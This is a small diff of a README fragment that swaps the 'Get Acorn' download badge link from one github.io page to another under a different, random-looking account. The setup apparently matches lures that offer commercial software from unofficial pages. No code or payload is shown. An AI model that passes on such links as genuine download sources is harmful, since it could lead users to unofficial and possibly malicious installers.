@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://manhyusuu48.github.io/.github/acorn">  
+<a href="https://tembilamusion.github.io/.github/acorn">  
 <img src="https://img.shields.io/badge/🖼_Get_Acorn-FF6F00?style=for-the-badge&logo=apple&logoColor=white" alt="Get Acorn">  
 </a>  
 </div>  
